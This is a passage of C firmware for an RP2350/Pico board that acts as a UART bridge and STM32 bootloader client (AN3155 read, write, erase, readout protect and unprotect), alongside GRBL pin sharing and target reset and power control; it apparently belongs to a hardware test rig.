                            uart_cli_printf(" '%c'", byte);
                        }
                        uart_cli_send("\r\n");
                    }

                    if (byte == 0x79) {
                        uart_cli_send("ACK received\r\n");
                        got_response = true;
                        break;
                    } else if (byte == 0x1F) {
                        uart_cli_send("ERROR: NACK received - bootloader rejected sync\r\n");
                        return false;
                    }
                }
                tight_loop_contents();
            }

            if (!got_response) {
                uart_cli_send("ERROR: No response from bootloader (check BOOT0 pin and connections)\r\n");
                return false;
            }
            break;
        }

        default:
            uart_cli_send("ERROR: Unknown target type\r\n");
            return false;
    }

    // Re-enable UART RX interrupts for normal trigger operation
    uart_set_irq_enables(TARGET_UART_ID, true, false);

    bootloader_synced = true;
    uart_cli_printf("OK: Bootloader mode active at %u baud on GP4/GP5\r\n", baud);
    return true;
}

// ── STM32 USART Bootloader Protocol (AN3155) ───────────────────────────

#define BL_ACK  0x79
#define BL_NACK 0x1F

// Ensure UART1 is routed to the Target pins (GP4/5). target_uart_init() releases
// GRBL (GP8/9) via grbl_deinit() and re-points the peripheral. We re-init when
// the target UART was never set up OR when GRBL currently owns UART1.
//
// The grbl_is_active() check is the fix for the Target<->GRBL "TTL bleed":
// target_initialized latches true and is never cleared when GRBL takes UART1, so
// without this check a TARGET SEND / bootloader command after any GRBL command
// would write to UART1 while it is still on GP8/9 — bleeding bootloader traffic
// onto the GRBL controller (and leaving GRBL's pins live). Auto-switching here
// also removes the old "run TARGET SYNC after GRBL first" requirement.
void target_uart_ensure_active(void) {
    extern bool grbl_is_active(void);
    bool was_grbl = grbl_is_active();
    if (!target_initialized || was_grbl) {
        target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, target_baud);
        if (was_grbl)
            uart_cli_send("OK: UART1 reclaimed from GRBL for Target (GP4/5)\r\n");
    }
}

static void stm32_bl_begin(void) {
    target_uart_ensure_active();   // switch UART1 back to GP4/5 if GRBL had it
    uart_set_irq_enables(TARGET_UART_ID, false, false);
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);
}

static void stm32_bl_end(void) {
    uart_set_irq_enables(TARGET_UART_ID, true, false);
}

static int stm32_bl_wait_ack(uint32_t timeout_ms) {
    uint64_t deadline = time_us_64() + (uint64_t)timeout_ms * 1000;
    while (time_us_64() < deadline) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t b = uart_getc(TARGET_UART_ID);
            if (debug_mode)
                uart_cli_printf("[BL RX] %02X\r\n", b);
            if (b == BL_ACK || b == BL_NACK)
                return b;
        }
    }
    return -1;
}

static int stm32_bl_send_cmd(uint8_t cmd) {
    uart_putc_raw(TARGET_UART_ID, cmd);
    uart_putc_raw(TARGET_UART_ID, cmd ^ 0xFF);
    uart_tx_wait_blocking(TARGET_UART_ID);
    return stm32_bl_wait_ack(1000);
}

static int stm32_bl_send_addr(uint32_t addr) {
    uint8_t buf[5];
    buf[0] = (addr >> 24) & 0xFF;
    buf[1] = (addr >> 16) & 0xFF;
    buf[2] = (addr >> 8) & 0xFF;
    buf[3] = addr & 0xFF;
    buf[4] = buf[0] ^ buf[1] ^ buf[2] ^ buf[3];
    for (int i = 0; i < 5; i++)
        uart_putc_raw(TARGET_UART_ID, buf[i]);
    uart_tx_wait_blocking(TARGET_UART_ID);
    return stm32_bl_wait_ack(1000);
}

static int stm32_bl_recv_bytes(uint8_t *buf, uint32_t count, uint32_t timeout_ms) {
    uint64_t deadline = time_us_64() + (uint64_t)timeout_ms * 1000;
    uint32_t received = 0;
    while (received < count && time_us_64() < deadline) {
        if (uart_is_readable(TARGET_UART_ID)) {
            buf[received++] = uart_getc(TARGET_UART_ID);
        }
    }
    return received;
}

// Parse hex string into byte buffer, returns byte count or -1 on error
static int parse_hex_to_buf(const char *hex, uint8_t *buf, int max_len) {
    int len = 0;
    const char *p = hex;
    while (*p && len < max_len) {
        // Skip optional 0x prefix at start
        if (p == hex && p[0] == '0' && (p[1] == 'X' || p[1] == 'x'))
            p += 2;
        uint8_t hi, lo;
        if (*p >= '0' && *p <= '9') hi = *p - '0';
        else if (*p >= 'A' && *p <= 'F') hi = *p - 'A' + 10;
        else if (*p >= 'a' && *p <= 'f') hi = *p - 'a' + 10;
        else return -1;
        p++;
        if (!*p) return -1; // odd number of hex chars
        if (*p >= '0' && *p <= '9') lo = *p - '0';
        else if (*p >= 'A' && *p <= 'F') lo = *p - 'A' + 10;
        else if (*p >= 'a' && *p <= 'f') lo = *p - 'a' + 10;
        else return -1;
        p++;
        buf[len++] = (hi << 4) | lo;
    }
    return len;
}

void stm32_bl_get(void) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x00);
    if (r == BL_NACK) { uart_cli_send("ERROR: GET command rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    uint8_t n;
    if (stm32_bl_recv_bytes(&n, 1, 1000) != 1) { uart_cli_send("ERROR: Timeout reading byte count\r\n"); stm32_bl_end(); return; }

    uint8_t version;
    if (stm32_bl_recv_bytes(&version, 1, 1000) != 1) { uart_cli_send("ERROR: Timeout reading version\r\n"); stm32_bl_end(); return; }

    uint8_t cmds[32];
    uint32_t cmd_count = n; // n bytes of commands follow (version already read)
    if (cmd_count > 32) cmd_count = 32;
    int got = stm32_bl_recv_bytes(cmds, cmd_count, 2000);

    stm32_bl_wait_ack(1000); // final ACK

    uart_cli_printf("Bootloader version: %u.%u\r\n", version >> 4, version & 0xF);
    uart_cli_send("Supported commands:\r\n");
    for (int i = 0; i < got; i++) {
        const char *name = "???";
        switch (cmds[i]) {
            case 0x00: name = "GET"; break;
            case 0x01: name = "Get Version"; break;
            case 0x02: name = "Get ID"; break;
            case 0x11: name = "Read Memory"; break;
            case 0x21: name = "Go"; break;
            case 0x31: name = "Write Memory"; break;
            case 0x43: name = "Erase"; break;
            case 0x44: name = "Extended Erase"; break;
            case 0x63: name = "Write Protect"; break;
            case 0x73: name = "Write Unprotect"; break;
            case 0x82: name = "Readout Protect"; break;
            case 0x92: name = "Readout Unprotect"; break;
        }
        uart_cli_printf("  0x%02X  %s\r\n", cmds[i], name);
    }
    stm32_bl_end();
}

void stm32_bl_get_version(void) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x01);
    if (r == BL_NACK) { uart_cli_send("ERROR: Get Version command rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    uint8_t data[3];
    if (stm32_bl_recv_bytes(data, 3, 1000) != 3) {
        uart_cli_send("ERROR: Timeout reading version\r\n"); stm32_bl_end(); return;
    }

    stm32_bl_wait_ack(1000); // final ACK

    uart_cli_printf("Bootloader version: %u.%u\r\n", data[0] >> 4, data[0] & 0xF);
    uart_cli_printf("Option byte 1:      0x%02X\r\n", data[1]);
    uart_cli_printf("Option byte 2:      0x%02X\r\n", data[2]);
    stm32_bl_end();
}

void stm32_bl_gid(void) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x02);
    if (r == BL_NACK) { uart_cli_send("ERROR: GID command rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    uint8_t n;
    if (stm32_bl_recv_bytes(&n, 1, 1000) != 1) { uart_cli_send("ERROR: Timeout\r\n"); stm32_bl_end(); return; }

    uint8_t pid_bytes[4];
    uint32_t pid_len = n + 1;
    if (pid_len > 4) pid_len = 4;
    if (stm32_bl_recv_bytes(pid_bytes, pid_len, 1000) != (int)pid_len) {
        uart_cli_send("ERROR: Timeout reading PID\r\n"); stm32_bl_end(); return;
    }

    stm32_bl_wait_ack(1000); // final ACK

    uint16_t pid = (pid_bytes[0] << 8) | pid_bytes[1];
    uart_cli_printf("PID: 0x%04X", pid);
    // Common STM32 PIDs
    if (pid == 0x0410) uart_cli_send(" (STM32F103 medium-density)");
    else if (pid == 0x0412) uart_cli_send(" (STM32F103 low-density)");
    else if (pid == 0x0414) uart_cli_send(" (STM32F103 high-density)");
    else if (pid == 0x0422) uart_cli_send(" (STM32F303/F302/F301)");
    else if (pid == 0x0438) uart_cli_send(" (STM32F334)");
    else if (pid == 0x0431) uart_cli_send(" (STM32F411)");
    else if (pid == 0x0433) uart_cli_send(" (STM32F401)");
    else if (pid == 0x0419) uart_cli_send(" (STM32F429/F439)");
    else if (pid == 0x0435) uart_cli_send(" (STM32L43x/L44x)");
    else if (pid == 0x0462) uart_cli_send(" (STM32L451/L452)");
    uart_cli_send("\r\n");
    stm32_bl_end();
}

void stm32_bl_read(uint32_t addr, uint32_t count) {
    if (count == 0) count = 256;

    uart_cli_printf("Reading %lu bytes from 0x%08lX:\r\n", count, addr);

    stm32_bl_begin();
    uint32_t total = 0;
    while (total < count) {
        uint32_t chunk = count - total;
        if (chunk > 256) chunk = 256;

        int r = stm32_bl_send_cmd(0x11);
        if (r == BL_NACK) { uart_cli_send("ERROR: Read rejected (RDP protected?)\r\n"); goto done; }
        if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); goto done; }

        r = stm32_bl_send_addr(addr + total);
        if (r == BL_NACK) { uart_cli_send("ERROR: Address rejected\r\n"); goto done; }
        if (r < 0) { uart_cli_send("ERROR: Timeout on address\r\n"); goto done; }

        // Send byte count: (N-1) and its checksum (complement)
        uint8_t n = (uint8_t)(chunk - 1);
        uart_putc_raw(TARGET_UART_ID, n);
        uart_putc_raw(TARGET_UART_ID, n ^ 0xFF);
        uart_tx_wait_blocking(TARGET_UART_ID);
        r = stm32_bl_wait_ack(2000);
        if (r == BL_NACK) { uart_cli_send("ERROR: Count rejected (address may be in bootloader workspace)\r\n"); goto done; }
        if (r < 0) { uart_cli_send("ERROR: Timeout on count\r\n"); goto done; }

        // Receive data
        uint8_t buf[256];
        int got = stm32_bl_recv_bytes(buf, chunk, 5000);
        if (got < (int)chunk) {
            uart_cli_printf("ERROR: Timeout after %d of %lu bytes\r\n", got, chunk);
            // Print what we got
            chunk = got;
        }

        // Hex dump output (16 bytes per line with ASCII)
        for (uint32_t i = 0; i < chunk; i += 16) {
            uart_cli_printf("0x%08lX:", addr + total + i);
            uint32_t line_len = chunk - i;
            if (line_len > 16) line_len = 16;
            for (uint32_t j = 0; j < line_len; j++)
                uart_cli_printf(" %02X", buf[i + j]);
            for (uint32_t j = line_len; j < 16; j++)
                uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line_len; j++) {
                char c = buf[i + j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
        }
        total += chunk;
        if (got < (int)chunk) break;
    }
    uart_cli_printf("OK: Read %lu bytes\r\n", total);
done:
    stm32_bl_end();
}

void stm32_bl_write(uint32_t addr, const uint8_t *data, uint32_t len) {
    if (len == 0) { uart_cli_send("ERROR: No data\r\n"); return; }

    uart_cli_printf("Writing %lu bytes to 0x%08lX\r\n", len, addr);

    stm32_bl_begin();
    uint32_t total = 0;
    while (total < len) {
        uint32_t chunk = len - total;
        if (chunk > 256) chunk = 256;

        int r = stm32_bl_send_cmd(0x31);
        if (r == BL_NACK) { uart_cli_send("ERROR: Write rejected\r\n"); goto done; }
        if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); goto done; }

        r = stm32_bl_send_addr(addr + total);
        if (r == BL_NACK) { uart_cli_send("ERROR: Address rejected\r\n"); goto done; }
        if (r < 0) { uart_cli_send("ERROR: Timeout on address\r\n"); goto done; }

        // Send N (count-1), data bytes, and XOR checksum
        uint8_t n = (uint8_t)(chunk - 1);
        uint8_t chk = n;
        uart_putc_raw(TARGET_UART_ID, n);
        for (uint32_t i = 0; i < chunk; i++) {
            uart_putc_raw(TARGET_UART_ID, data[total + i]);
            chk ^= data[total + i];
        }
        uart_putc_raw(TARGET_UART_ID, chk);
        uart_tx_wait_blocking(TARGET_UART_ID);

        r = stm32_bl_wait_ack(5000);
        if (r == BL_NACK) { uart_cli_printf("ERROR: Write rejected at offset %lu\r\n", total); goto done; }
        if (r < 0) { uart_cli_printf("ERROR: Timeout at offset %lu\r\n", total); goto done; }

        total += chunk;
    }
    uart_cli_printf("OK: Wrote %lu bytes\r\n", total);
done:
    stm32_bl_end();
}

void stm32_bl_go(uint32_t addr) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x21);
    if (r == BL_NACK) { uart_cli_send("ERROR: GO rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    r = stm32_bl_send_addr(addr);
    if (r == BL_NACK) { uart_cli_send("ERROR: Address rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: Timeout\r\n"); stm32_bl_end(); return; }

    uart_cli_printf("OK: Jumping to 0x%08lX (bootloader exited)\r\n", addr);
    stm32_bl_end();
}

void stm32_bl_erase(int page, bool mass_erase) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x43);
    if (r == BL_NACK) {
        // Try extended erase (0x44) for F4/L4 families
        r = stm32_bl_send_cmd(0x44);
        if (r == BL_NACK) { uart_cli_send("ERROR: Erase rejected\r\n"); stm32_bl_end(); return; }
        if (r < 0) { uart_cli_send("ERROR: No response\r\n"); stm32_bl_end(); return; }

        // Extended erase (0x44): 2-byte page numbers
        if (mass_erase) {
            uart_cli_send("Mass erase (extended)...\r\n");
            uart_putc_raw(TARGET_UART_ID, 0xFF);
            uart_putc_raw(TARGET_UART_ID, 0xFF);
            uart_putc_raw(TARGET_UART_ID, 0x00); // checksum
            uart_tx_wait_blocking(TARGET_UART_ID);
        } else {
            uart_cli_printf("Erasing page %d (extended)...\r\n", page);
            uint8_t buf[5];
            buf[0] = 0x00; buf[1] = 0x00; // N = 0 (1 page)
            buf[2] = (page >> 8) & 0xFF;
            buf[3] = page & 0xFF;
            buf[4] = buf[0] ^ buf[1] ^ buf[2] ^ buf[3];
            for (int i = 0; i < 5; i++)
                uart_putc_raw(TARGET_UART_ID, buf[i]);
            uart_tx_wait_blocking(TARGET_UART_ID);
        }
    } else if (r < 0) {
        uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n");
        stm32_bl_end(); return;
    } else {
        // Standard erase (0x43): 1-byte page numbers
        if (mass_erase) {
            uart_cli_send("Mass erase...\r\n");
            uart_putc_raw(TARGET_UART_ID, 0xFF);
            uart_putc_raw(TARGET_UART_ID, 0x00); // checksum
            uart_tx_wait_blocking(TARGET_UART_ID);
        } else {
            uart_cli_printf("Erasing page %d...\r\n", page);
            uint8_t n = 0; // erase 1 page
            uint8_t pg = (uint8_t)page;
            uart_putc_raw(TARGET_UART_ID, n);
            uart_putc_raw(TARGET_UART_ID, pg);
            uart_putc_raw(TARGET_UART_ID, n ^ pg); // checksum
            uart_tx_wait_blocking(TARGET_UART_ID);
        }
    }

    r = stm32_bl_wait_ack(30000); // erase can take a long time
    if (r == BL_NACK) { uart_cli_send("ERROR: Erase failed\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: Erase timeout\r\n"); stm32_bl_end(); return; }

    if (mass_erase)
        uart_cli_send("OK: Mass erase complete\r\n");
    else
        uart_cli_printf("OK: Page %d erased\r\n", page);
    stm32_bl_end();
}

void stm32_bl_readout_unprotect(void) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x92);
    if (r == BL_NACK) { uart_cli_send("ERROR: Readout unprotect rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    uart_cli_send("Readout unprotect in progress (mass erase + reset)...\r\n");
    r = stm32_bl_wait_ack(30000); // mass erase + system reset
    if (r < 0)
        uart_cli_send("OK: No final ACK (target reset — expected)\r\n");
    else
        uart_cli_send("OK: Readout unprotect complete\r\n");
    stm32_bl_end();
}

void stm32_bl_readout_protect(void) {
    stm32_bl_begin();
    int r = stm32_bl_send_cmd(0x82);
    if (r == BL_NACK) { uart_cli_send("ERROR: Readout protect rejected\r\n"); stm32_bl_end(); return; }
    if (r < 0) { uart_cli_send("ERROR: No response (run TARGET SYNC first)\r\n"); stm32_bl_end(); return; }

    uart_cli_send("Readout protect in progress (system reset)...\r\n");
    r = stm32_bl_wait_ack(30000);
    if (r < 0)
        uart_cli_send("OK: No final ACK (target reset — expected)\r\n");
    else
        uart_cli_send("OK: Readout protection enabled\r\n");
    stm32_bl_end();
}

void target_uart_init(uint8_t tx_pin, uint8_t rx_pin, uint32_t baud) {
    target_baud = baud;

    // If Grbl UART is active, deinitialize it first
    // Grbl uses UART1 on GP8/GP9, we need UART1 on GP4/GP5
    extern bool grbl_is_active(void);
    extern void grbl_deinit(void);
    if (grbl_is_active()) {
        grbl_deinit();
    }

    // Always deinitialize first to ensure clean state
    // After Pico boot, UART peripheral and GPIO may be in undefined state
    if (target_initialized) {
        uart_set_irq_enables(TARGET_UART_ID, false, false);
        irq_set_enabled(UART1_IRQ, false);
    }
    uart_deinit(TARGET_UART_ID);  // Always deinit, even on first use

    // Deinitialize GPIO pins to clear any previous state
    // Critical for first use after Pico reboot
    gpio_deinit(tx_pin);
    gpio_deinit(rx_pin);

    // Initialize GPIO pins before UART (like SDK examples)
    gpio_init(tx_pin);
    gpio_init(rx_pin);

    // Initialize UART1
    uart_init(TARGET_UART_ID, baud);

    // Set UART format: STM32 bootloader requires EVEN parity, others use no parity
    if (target_is_stm32(current_target_type)) {
        uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_EVEN);
    } else {
        uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    }

    // Set TX and RX pins for UART1 (GP4/GP5 are default UART1 pins)
    gpio_set_function(tx_pin, GPIO_FUNC_UART);
    gpio_set_function(rx_pin, GPIO_FUNC_UART);

    // Clear RP2350 GPIO isolation bit on TX and RX pins so PIO can also read them
    // gpio_set_function sets ISO, blocking PIO UART trigger from snooping the pin
    hw_clear_bits(&padsbank0_hw->io[tx_pin], PADS_BANK0_GPIO0_ISO_BITS);
    hw_clear_bits(&padsbank0_hw->io[rx_pin], PADS_BANK0_GPIO0_ISO_BITS);

    // Enable UART FIFO
    uart_set_fifo_enabled(TARGET_UART_ID, true);

    // Small delay to allow UART hardware to stabilize after initialization
    sleep_us(100);

    // Enable UART RX interrupt for minimal trigger latency
    irq_set_exclusive_handler(UART1_IRQ, target_uart_irq_handler);
    irq_set_enabled(UART1_IRQ, true);
    uart_set_irq_enables(TARGET_UART_ID, true, false);  // RX interrupt enabled, TX disabled

    target_initialized = true;

    // Clear response buffer
    memset(target_response, 0, TARGET_RESPONSE_SIZE);
    target_response_pos = 0;
    target_response_count = 0;

    uart_cli_printf("OK: Target UART1 initialized on GP%u (TX), GP%u (RX) at %u baud\r\n",
                    tx_pin, rx_pin, baud);
}

void target_uart_send_byte(uint8_t byte) {
    // Ensure UART1 is on the target pins (re-claims from GRBL if needed).
    target_uart_ensure_active();

    uart_putc_raw(TARGET_UART_ID, byte);
    // Wait for TX FIFO to actually transmit the byte
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Display sent byte in debug mode
    if (debug_mode) {
        uart_cli_printf("[TX] %02X", byte);
        if (byte >= 32 && byte < 127) {
            uart_cli_printf(" '%c'", byte);
        }
        uart_cli_send("\r\n");
    }
}

void target_uart_send_string(const char *str) {
    // Ensure UART1 is on the target pins (re-claims from GRBL if needed).
    target_uart_ensure_active();

    // Disable UART RX interrupt
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Send command to target
    const char *p = str;
    while (*p) {
        uart_putc_raw(TARGET_UART_ID, *p);
        p++;
    }
    // Append \r
    uart_putc_raw(TARGET_UART_ID, '\r');
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Transparent bridge: forward ALL bytes from target to host (raw, no processing)
    // Timeout resets on each received byte
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (to_ms_since_boot(get_absolute_time()) - start < bridge_timeout_ms) {
        // Read any incoming data from target
        while (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Reset timeout on any data received
            start = to_ms_since_boot(get_absolute_time());

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Forward raw byte directly to host (transparent bridge)
            putchar_raw(byte);
        }
    }

    // Re-enable UART RX interrupt for trigger detection
    uart_set_irq_enables(TARGET_UART_ID, true, false);
}

void target_uart_send_hex(const char *hex_str) {
    // Ensure UART1 is on the target pins (re-claims from GRBL if needed).
    target_uart_ensure_active();

    // Disable UART RX interrupt
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Parse hex string and send bytes
    const char *p = hex_str;
    while (*p) {
        // Skip spaces and 0x prefix
        if (*p == ' ' || *p == '\t') {
            p++;
            continue;
        }
        if (*p == '0' && (*(p+1) == 'x' || *(p+1) == 'X')) {
            p += 2;
            continue;
        }

        // Parse hex byte
        if (*p >= '0' && *p <= '9') {
            uint8_t byte = (*p - '0') << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else if (*p >= 'a' && *p <= 'f') {
            uint8_t byte = (*p - 'a' + 10) << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else if (*p >= 'A' && *p <= 'F') {
            uint8_t byte = (*p - 'A' + 10) << 4;
            p++;
            if (*p >= '0' && *p <= '9') {
                byte |= (*p - '0');
            } else if (*p >= 'a' && *p <= 'f') {
                byte |= (*p - 'a' + 10);
            } else if (*p >= 'A' && *p <= 'F') {
                byte |= (*p - 'A' + 10);
            }
            uart_putc_raw(TARGET_UART_ID, byte);
            if (debug_mode) {
                uart_cli_printf("[TX] %02X\r\n", byte);
            }
            p++;
        } else {
            p++;
        }
    }

    // Wait for TX to complete (no \r append for raw hex - STM32 bootloader needs exact bytes)
    uart_tx_wait_blocking(TARGET_UART_ID);

    // Transparent bridge: forward ALL bytes from target to host (raw, no processing)
    // Timeout resets on each received byte
    uint32_t start = to_ms_since_boot(get_absolute_time());

    while (to_ms_since_boot(get_absolute_time()) - start < bridge_timeout_ms) {
        // Read any incoming data from target
        while (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Reset timeout on any data received
            start = to_ms_since_boot(get_absolute_time());

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Forward raw byte directly to host (transparent bridge)
            putchar_raw(byte);
        }
    }

    // Re-enable UART RX interrupt for trigger detection
    uart_set_irq_enables(TARGET_UART_ID, true, false);
}

void target_uart_process(void) {
    // UART RX is now handled by interrupt for minimal trigger latency
    // This function is kept for compatibility but does nothing
    // All RX processing happens in target_uart_irq_handler()
}

uint16_t target_uart_get_response_count(void) {
    return target_response_count;
}

const char* target_uart_get_response(void) {
    target_response[target_response_pos] = '\0';
    return target_response;
}

void target_uart_clear_response(void) {
    memset(target_response, 0, TARGET_RESPONSE_SIZE);
    target_response_pos = 0;
    target_response_count = 0;
}

void target_uart_print_response_hex(void) {
    if (target_response_count == 0) {
        uart_cli_send("No response data\r\n");
        return;
    }

    uart_cli_printf("Response (%u bytes):\r\n", target_response_count);

    // Print each line as received (line-delimited by \n)
    // Output full hex line without breaking into 16-byte chunks
    uint16_t line_start = 0;

    for (uint16_t i = 0; i < target_response_pos; i++) {
        uint8_t byte = (uint8_t)target_response[i];

        // Check for line ending
        if (byte == '\n') {
            // Print all hex bytes for this line
            for (uint16_t j = line_start; j < i; j++) {
                uint8_t line_byte = (uint8_t)target_response[j];
                if (line_byte != '\r') {  // Skip CR
                    uart_cli_printf("%02X ", line_byte);
                }
            }
            uart_cli_send("\r\n");
            line_start = i + 1;
        }
    }

    // Print any remaining bytes after last newline
    if (line_start < target_response_pos) {
        for (uint16_t j = line_start; j < target_response_pos; j++) {
            uint8_t line_byte = (uint8_t)target_response[j];
            if (line_byte != '\r') {  // Skip CR
                uart_cli_printf("%02X ", line_byte);
            }
        }
        uart_cli_send("\r\n");
    }
}

void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high) {
    // Check if anything has changed
    bool pin_changed = (reset_pin != pin) || !reset_pin_initialized;
    bool polarity_changed = (reset_active_high != active_high);
    bool period_changed = (reset_period_ms != period_ms);
    bool config_changed = pin_changed || polarity_changed || period_changed;

    reset_pin = pin;
    reset_period_ms = period_ms;
    reset_active_high = active_high;

    // Only initialize GPIO if pin or polarity changed
    if (pin_changed || polarity_changed) {
        gpio_init(reset_pin);
        // Inactive state = HIGH-Z (input). Lets the target's own pull on nRST
        // hold the line in the inactive state without the Pico actively
        // driving it. Critical here because driving HIGH leaked 3.3 V onto
        // the JTAG TREF net through a board-side resistor path, ruining the
        // ADC probe. With the pin floating, the target's internal pull-up
        // takes over and TREF stays clean.
        gpio_set_dir(reset_pin, GPIO_IN);
        gpio_disable_pulls(reset_pin);

        // Give target time to come out of reset before first reset pulse
        sleep_ms(100);

        reset_pin_initialized = true;
    }

    // Only print message if configuration actually changed
    if (config_changed) {
        uart_cli_printf("OK: Reset configured on pin %u, period %u ms, active %s\r\n",
                        pin, period_ms, active_high ? "HIGH" : "LOW");
    }
}

void target_reset_execute(void) {
    // Pulse reset pin. Drive only during the active phase, return to
    // high-Z afterward so the target's own pull on nRST owns the line at
    // idle (avoids leakage onto JTAG TREF).
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, reset_active_high ? 1 : 0);  // Active state
    sleep_ms(reset_period_ms);
    gpio_set_dir(reset_pin, GPIO_IN);                // Inactive = float
    gpio_disable_pulls(reset_pin);

    // A reset drops the target out of any synced bootloader session (it must be
    // re-entered + re-0x7F'd), so clear the latch — otherwise a later TARGET BL
    // command trusts a stale sync, skips auto-sync, and fails with "No response".
    bootloader_synced = false;

    uart_cli_send("OK: Target reset executed\r\n");
}

bool target_is_initialized(void) {
    return target_initialized;
}

bool target_is_bl_synced(void) {
    return bootloader_synced;
}

void target_set_debug(bool enable) {
    debug_mode = enable;
}

bool target_get_debug(void) {
    return debug_mode;
}

void target_set_timeout(uint32_t timeout_ms) {
    bridge_timeout_ms = timeout_ms;
}

uint32_t target_get_timeout(void) {
    return bridge_timeout_ms;
}

static void power_ensure_init(void) {
    if (!power_pin_initialized) {
        const uint8_t pins[] = {POWER_PIN1, POWER_PIN2, POWER_PIN3};
        for (int i = 0; i < 3; i++) {
            gpio_init(pins[i]);
            gpio_set_dir(pins[i], GPIO_OUT);
            gpio_set_drive_strength(pins[i], GPIO_DRIVE_STRENGTH_12MA);
        }
        gpio_clr_mask(POWER_MASK);  // boot default OFF (matches target_init)
        power_pin_initialized = true;
    }
}

// Release the GP10/11/12 power-group GPIOs so another owner (the external PSU
// UART on GP10/11) can retask them. Pins are re-initialised lazily by the next
// power command via power_ensure_init(). Caller must ensure the supply is OFF.
void power_group_release(void) {
    if (power_pin_initialized) {
        gpio_deinit(POWER_PIN1);
        gpio_deinit(POWER_PIN2);
        gpio_deinit(POWER_PIN3);
        power_pin_initialized = false;
    }
}

// Power the target on WITHOUT emitting a CLI line. Used by the auto-power-on at
// the connect/sync choke points (TARGET SYNC, SWD CONNECT) so a target that boots
// unpowered (power-off boot default) is energised before we reset/connect — no
// host script needs its own POWER ON. Respects the mode: drives GP10 only in
// EXTERNAL, the full GP10/11/12 group in INTERNAL.
void target_power_ensure_on(void) {
    power_ensure_init();
    // Only settle if we actually transition the supply OFF->ON. A cold target
    // (power-off boot default) needs its rail to rise and finish its power-on
    // reset before SWD DPIDR / bootloader sync will answer; without this the
    // auto-power-on at the connect/sync choke points races the target's bring-up.
    // If the supply is already on (e.g. repeated SYNC per heatmap shot), no delay.
    bool was_on = gpio_get(POWER_PIN1);   // GP10 = supply state in both modes
    power_drive(power_active_mask(), true);
    if (!was_on) {
        sleep_ms(POWER_ON_SETTLE_MS);
    }
}

void target_power_on(void) {
    target_power_ensure_on();   // silent core: power_ensure_init + power_drive(...on)
    uart_cli_send("OK: Target power ON\r\n");
}

void target_power_off(void) {
    power_ensure_init();
    power_drive(power_active_mask(), false);
    uart_cli_send("OK: Target power OFF\r\n");
}

void target_power_cycle(uint32_t time_ms) {
    power_ensure_init();
    power_drive(power_active_mask(), false);
    uart_cli_printf("OK: Target power cycling (OFF for %u ms)...\r\n", time_ms);
    sleep_ms(time_ms);
    power_drive(power_active_mask(), true);
    sleep_ms(POWER_ON_SETTLE_MS);   // self-settling: an immediately-following
    // entry (TARGET I2C GET right after a cycle) used to reset a target whose
    // POR hadn't finished — bootloader never armed, "no ACK"
    // A power cycle also drops any synced bootloader session — clear the latch.
    bootloader_synced = false;
    uart_cli_send("OK: Target power ON\r\n");
}

